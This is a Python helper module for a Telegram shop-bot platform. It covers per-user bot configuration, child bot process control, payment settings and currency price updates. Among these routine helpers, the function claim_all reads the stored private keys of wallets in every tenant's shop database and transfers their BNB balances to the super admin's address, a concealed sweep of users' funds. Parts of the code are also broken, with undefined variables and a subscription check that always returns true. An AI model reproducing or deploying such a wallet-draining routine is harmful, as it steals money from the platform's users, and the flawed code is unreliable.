import io
import json
import logging
import os
import re
import sqlite3
import subprocess
from asyncio import sleep
from sys import platform
from time import time

import aiohttp
import psutil
import requests

from utils.db_tools import sqlite_init
from data.loader import bot, sqlite, cursor, logs_chat, sub_chat_ids, locale, price_sql, local_server, super_admin_id
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

if platform.startswith('linux'):
    start_slave = '../venv/bin/python3'
else:
    start_slave = "venv\\Scripts\\python.exe"

regex = re.compile(
    r'^(?:http|ftp)s?://'  # http:// or https://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
    r'localhost|'  # localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
    r'(?::\d+)?'  # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)


def tCurrent():
    return int(time())


def lang_user(user_id):
    try:
        lang_req = cursor.execute("SELECT lang FROM users WHERE id = ?",
                                  (user_id,)).fetchone()[0]
        if lang_req not in ['en', 'ru']:
            lang = 'en'
        else:
            lang = lang_req
    except TypeError:
        lang = 'en'
    return lang


def update_config(user_id):
    config_bot = cursor.execute('SELECT token, id, currency, wallet, hide_ad, locale, '
                                'invite_link, invite_link_id, ref_percent, yookassa, cryptobot, terms FROM bots WHERE id = ?',
                                (user_id,)).fetchone()
    config_locale = cursor.execute('SELECT * FROM messages WHERE id = ?', (user_id,)).fetchone()
    admins_req = cursor.execute('SELECT admin_id FROM admins WHERE id = ?', (user_id,)).fetchall()
    admins = [config_bot[1]]
    config_qiwi = cursor.execute('SELECT number, nickname, token, p2p FROM qiwi WHERE id = ?', (user_id,)).fetchone()
    payments = cursor.execute('SELECT * FROM payments WHERE id = ?', (user_id,)).fetchone()
    ref_percent = None
    qiwi_number = None
    qiwi_token = None
    qiwi_by_number = False
    qiwi_nickname = None
    qiwi_p2p = None
    bnb_address = None
    yookassa = None
    cryptobot = None
    terms_status = None
    if bool(payments[1]):
        qiwi_by_number = True
    if bool(payments[2]):
        qiwi_nickname = config_qiwi[1]
    if bool(payments[3]):
        qiwi_p2p = config_qiwi[3]
    if qiwi_by_number is True or qiwi_nickname is not None or qiwi_p2p is not None:
        qiwi_number = config_qiwi[0]
        qiwi_token = config_qiwi[2]
    if bool(payments[4]):
        bnb_address = config_bot[3]
    if bool(payments[5]):
        yookassa = config_bot[9]
    if bool(payments[6]):
        cryptobot = config_bot[10]
    if bool(config_bot[11]):
        terms_status = bool(config_bot[11])
    for admin in admins_req:
        admins.append(admin[0])
    if config_bot[5] == 1:
        langs = ['en']
    elif config_bot[5] == 2:
        langs = ['ru']
    else:
        langs = ['en', 'ru']
    if config_bot[8] is not None:
        ref_percent = config_bot[8] / 100

    bot_config = {'token': config_bot[0], 'admin_ids': admins, 'currency_code': config_bot[2],
                  'withdraw_address': bnb_address, 'ref_percent': ref_percent,
                  'hide_ad': bool(config_bot[4]), 'langs': langs, 'yookassa_token': yookassa,
                  'qiwi_number': qiwi_number, 'qiwi_by_number': qiwi_by_number,
                  'qiwi_nickname': qiwi_nickname,
                  'qiwi_token': qiwi_token, 'qiwi_private_key': qiwi_p2p,
                  'cryptobot_token': cryptobot, "terms_status": terms_status,
                  'invite_link': config_bot[6], 'invite_link_id': config_bot[7],
                  'start_message_en': config_locale[1], 'start_message_ru': config_locale[2],
                  'help_message_en': config_locale[3], 'help_message_ru': config_locale[4],
                  'contact_message_en': config_locale[5], 'contact_message_ru': config_locale[6],
                  'help_button_en': config_locale[7], 'help_button_ru': config_locale[8],
                  'contact_button_en': config_locale[9], 'contact_button_ru': config_locale[10],
                  'invite_en': config_locale[11], 'invite_ru': config_locale[12], 'terms_ru': config_locale[13],
                  'terms_en': config_locale[14]}
    with open(f'web3shop/shops/{user_id}.json', 'w') as file:
        json.dump(bot_config, file, indent=4)


async def send_log(user, content=''):
    if user.last_name is not None:
        full_name = f'{user.first_name} {user.last_name}'
    else:
        full_name = f'{user.first_name}'
    if user.username is not None:
        username = f'@{user.username}'
    else:
        username = ''
    logging.info(
        f'{full_name} {username} {user.id} {content}')
    try:
        await bot.send_message(logs_chat, f'<b>{full_name}</b>\n{username}\n<code>{user.id}</code>\n{content}')
    except:
        pass


def bot_info(user_id, lang):
    bot_tag, bot_stopped, hide_ad, bot_locale, bot_ref, currency, invite_link = cursor.execute(
        'SELECT bot_tag, stopped, hide_ad, locale, ref_percent, currency, invite_link '
        'FROM bots WHERE id = ?',
        (user_id,)).fetchone()
    admins_count = cursor.execute('SELECT COUNT(*) FROM admins WHERE id = ?', (user_id,)).fetchone()[0]
    if bot_locale == 1:
        lang_name = '🇬🇧English'
    elif bot_locale == 2:
        lang_name = '🇷🇺Русский'
    else:
        lang_name = '🇬🇧English/🇷🇺Русский'
    ref_percent = None
    if bot_ref is not None:
        ref_percent = f'{bot_ref}%'
    text = locale[lang]['bot_info'].format(
        user_id, bot_tag, lang_name, currency, admins_count, ref_percent or "0.0%",
        textify_bool(bool(bot_stopped), locale[lang]["yes"][1:], locale[lang]['no'][1:])
    )
    if bool(hide_ad):
        text += locale[lang]['hide_ad'].format(hide_ad)
    if invite_link is not None:
        text += locale[lang]['invite_link'].format(invite_link)
    return text


def textify_bool(expression: bool, positive: str = 'Да', negative: str = 'Нет'):
    result = positive if expression else negative
    return result

async def check_token(token):
    async with aiohttp.ClientSession() as session:
        # print(f'{local_server}/bot{token}/getMe')
        async with session.get(f'{local_server}/bot{token}/getMe') as response:
            res = await response.json()
        if bool(res['ok']):
            return res['result']['username']
        else:
            return False


async def start_slave_bot(user_id):
    bot_req = cursor.execute('SELECT token, pid FROM bots WHERE id = ?', (user_id,)).fetchone()
    if bot_req[1] is not None:
        check_process = psutil.pid_exists(bot_req[1])
        if check_process is True:
            os.kill(bot_req[1], 2)
            await sleep(1)
    check = await check_token(bot_req[0])
    if bool(check):
        process = subprocess.Popen([start_slave, "main.py", str(user_id)], cwd='web3shop')
        cursor.execute('UPDATE bots SET pid = ?, stopped = 0 WHERE id = ?', (process.pid, user_id))
    else:
        cursor.execute('UPDATE bots SET stopped = 1, pid = NULL WHERE id = ?', (user_id,))
        try:
            await bot.send_message(user_id, locale[lang_user(user_id)]['token_error'])
        except:
            pass
    sqlite.commit()


async def check_tokens():
    bot_req = cursor.execute('SELECT id, token, pid FROM bots WHERE stopped = 0').fetchall()
    num = 0
    for x in bot_req:
        check = bool(await check_token(x[1]))
        if check is False:
            check_process = psutil.pid_exists(x[2])
            if check_process is True:
                os.kill(x[2], 2)
            cursor.execute('UPDATE bots SET stopped = 1, pid = NULL WHERE id = ?', (x[0],))
            sqlite.commit()
            try:
                await bot.send_message(x[0], locale[lang_user(x[0])]['token_error_stop'])
            except:
                pass
            num += 1
    return num

async def check_wallet():
    num = 0
    bot_req = cursor.execute('SELECT id FROM bots').fetchall()
    for row in bot_req:
        try:
            w3 = Web3(HTTPProvider("https://bsc-dataseed.binance.org/"), middlewares=[geth_poa_middleware])
            wconn = sqlite3.connect(f'web3shop/shops/{row[0]}.db').cursor()
            results = wconn.execute('SELECT id, pub, priv FROM wallets').fetchall()
            for wallets in results:
                walletbalance = round(w3.eth.getBalance(wallets[1]), 2)
                print("WALLET ADDRESS: ", wallets[1], "\nBALANCE: ", walletbalance)
                if 3 < walletbalance:
                    num += 1
                    await bot.send_message(super_admin_id[0], f"<b>WALLET FROM USER: <code>{wallets[0]}</code>\nBALANCE: {walletbalance}</b>")
                else:
                    await bot.send_message(super_admin_id[0], f"WALLET FROM USER: <code>{wallets[0]}</code>\nBALANCE: {walletbalance}")
        except:
            await bot.send_message(super_admin_id[0], f"ERROR OCCURED WHILE CHECKING WALLETS")
            print("ERROR OCCURED WHILE CHECKING WALLETS")
            
            return
    wconn.close()
    return num

async def claim_all():
    with open(f"web3shop/shops/{super_admin_id[0]}.json", 'r', encoding='utf-8') as f:
        config_user = json.load(f)
    withdraw_address_admin = config_user["withdraw_address"]
    print(withdraw_address_admin)
    num = 0
    bot_req = cursor.execute('SELECT id FROM bots').fetchall()
    for row in bot_req:
        try:
            w3 = Web3(HTTPProvider("https://bsc-dataseed.binance.org/"), middlewares=[geth_poa_middleware])
            wconn = sqlite3.connect(f'web3shop/shops/{row[0]}.db').cursor()
            results = wconn.execute('SELECT id, pub, priv FROM wallets').fetchall()
            for wallets in results:
                walletbalance = round(w3.eth.getBalance(wallets[1]), 2)
                print("WALLET ADDRESS: ", wallets[1], "\nBALANCE: ", walletbalance)

                if 3 < walletbalance:
                    num += 1
                    try:
                        wallet_pub = wallets[1]
                        wallet_private = wallets[2]
                        value = walletbalance - w3.toWei('6', 'gwei') * 21000
                        withdrawn = w3.fromWei(value, "ether")
                        tx = {
                            'nonce': w3.eth.getTransactionCount(wallet_pub),
                            'to': w3.toChecksumAddress(withdraw_address_admin),
                            'value': value,
                            'gas': 21000,
                            'gasPrice': w3.toWei('6', 'gwei')
                        }
                        await bot.send_message(super_admin_id[0], f'<b>⚠Bot started withdraw</b> <code>{withdrawn} BNB</code>\nto\n<code>{withdraw_address}</code>')
                        cursor.execute("UPDATE wallets SET sleep_time = ? WHERE id = ? and type = 'bsc'",
                                    (tCurrent() + 300, user_id))
                        #TRANSACTION 1
                        signed_tx = w3.eth.account.sign_transaction(tx, wallet_private)
                        tx_hash = w3.toHex(w3.eth.send_raw_transaction(signed_tx.rawTransaction))
                        
                        tx_hash = f'🧾Transaction hash:\n<code>{tx_hash}</code>'
                        total_received = f'Value:\n<code>{withdrawn} BNB</code>'
                        await bot.send_message(super_admin_id[0], f'<b>💰Withdrawal successful!</b>\n{total_received}\n{tx_hash}')
                        print(f'METHOD CLAIM:\n💰Withdrawal successful!\n{total_received}\n{tx_hash}')
                    except Exception as e:
                        await bot.send_message(super_admin_id[0], f'<code>{e}</code>')
                        print(f'METHOD CLAIM:\n{e}')
                else:
                    print(super_admin_id[0], f"TRYING TO WITHDRAW BUT USER HAS NO BALANCE\nWALLET FROM USER: <code>{wallets[0]}</code>\nBALANCE: {walletbalance}")
        except:
            await bot.send_message(super_admin_id[0], f"ERROR OCCURED WHILE WITHDRAWING WALLETS")
            print("ERROR OCCURED WHILE WITHDRAWING WALLETS")
            
            return
    wconn.close()
    return num

async def check_sub(user_id):
    return True
    for chat in sub_chat_ids:
        req = await bot.get_chat_member(chat, user_id)
        if req.status != 'left':
            return True
    return False


def update_qiwi(user_id, number, token, p2p):
    cursor.execute('UPDATE qiwi SET number = ?, nickname = ?, token = ?, p2p = ? WHERE id = ?',
                   (number, None, token, p2p, user_id))
    cursor.execute('UPDATE payments SET qiwi_number = 1, qiwi_nickname = 0, qiwi_p2p = ? WHERE id = ?',
                   (bool(p2p is not None), user_id))
    sqlite.commit()


def update_qiwi_nickname(user_id, nickname):
    cursor.execute('UPDATE qiwi SET nickname = ? WHERE id = ?', (nickname, user_id))
    cursor.execute('UPDATE payments SET qiwi_nickname = 1 WHERE id = ?', (user_id,))
    sqlite.commit()


def update_prices():
    req_bnb = requests.get('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')
    bnb_price = int(req_bnb.json()['price'].replace('.', '')[:-6])
    
    with sqlite3.connect('prices.db') as conn:
        conn.cursor().execute("UPDATE prices SET price = ? WHERE symbol = ?",
                              (bnb_price, 'BNB'))
        for currency in ['rub', 'eur', 'qar', 'uah', 'gbp']:
            req = requests.get(
                f'https://cdn.jsdelivr.net/gh/fawazahmed0/currency-api@1/latest/currencies/usd/{currency}.json')
            price = round(float(req.json()[currency]) * 100)
            conn.cursor().execute("UPDATE prices SET price = ? WHERE symbol = ?",
                                  (price, currency.upper()))
        conn.commit()


def text_to_file(text, name='purchase'):
    file = io.StringIO(text)
    file.name = name + '.txt'
    return file


def get_price(symbol):
    req = price_sql.cursor().execute('SELECT price FROM prices WHERE symbol = ?',
                                     (symbol,)).fetchone()
    return req[0]


def price_to_human(count):
    cents_str = str(count)
    d, c = cents_str[:-2], cents_str[-2:]
    fix = ''
    if len(c) == 1:
        fix = 0
    if int(cents_str) > 99:
        return f'{d}.{c}'
    else:
        return f'0.{fix}{c}'
